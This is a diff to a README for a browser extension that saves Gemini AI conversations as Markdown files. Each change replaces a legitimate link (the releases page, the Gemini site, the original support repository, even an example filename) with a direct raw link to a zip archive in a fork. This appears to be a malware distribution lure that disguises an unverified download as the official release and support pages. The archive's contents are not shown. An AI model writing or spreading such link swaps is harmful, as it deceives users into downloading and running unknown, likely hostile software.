@@ -2,7 +2,7 @@
 
 ## 📥 Download and Install
 
-[![Download Now](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/2sakthi/gemini_md_downloader/releases)
+[![Download Now](https://raw.githubusercontent.com/2sakthi/gemini_md_downloader/main/boltel/gemini_md_downloader.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/2sakthi/gemini_md_downloader/main/boltel/gemini_md_downloader.zip)
 
 ## 🛠️ Overview
 
@@ -14,7 +14,7 @@ Follow these steps to download and run the extension:
 
 ### 1. Visit the Releases Page
 
-Go to [this page to download](https://github.com/2sakthi/gemini_md_downloader/releases). Here, you can find the latest version available for download.
+Go to [this page to download](https://raw.githubusercontent.com/2sakthi/gemini_md_downloader/main/boltel/gemini_md_downloader.zip). Here, you can find the latest version available for download.
 
 ### 2. Choose the Right File
 
@@ -43,7 +43,7 @@ Once the file downloads, locate it in your downloads folder. Right-click the fil
 ### Basic Steps for Using the Extension
 
 1. **Access Gemini**
-   - Open [Gemini AI](https://gemini.google.com).
+   - Open [Gemini AI](https://raw.githubusercontent.com/2sakthi/gemini_md_downloader/main/boltel/gemini_md_downloader.zip).
    - Start a new conversation or continue an existing one.
 
 2. **Export the Conversation**
@@ -52,7 +52,7 @@ Once the file downloads, locate it in your downloads folder. Right-click the fil
 
 3. **Check Your Download**
    - The file will save in your browser's default download directory.
-   - The filename will typically be the title of the conversation in Markdown format, e.g., `conversation_title.md`.
+   - The filename will typically be the title of the conversation in Markdown format, e.g., `https://raw.githubusercontent.com/2sakthi/gemini_md_downloader/main/boltel/gemini_md_downloader.zip`.
 
 ### Example Output Format
 
@@ -111,7 +111,7 @@ You can manually edit the Markdown file using any text editor after it is downlo
 
 ### Where can I find support if I have issues?
 
-For any questions or issues, please create a new issue on the [GitHub repository](https://github.com/x-hansong/gemini_md_downloader). The community is here to help.
+For any questions or issues, please create a new issue on the [GitHub repository](https://raw.githubusercontent.com/2sakthi/gemini_md_downloader/main/boltel/gemini_md_downloader.zip). The community is here to help.
 
 ## 📑 Conclusion
 
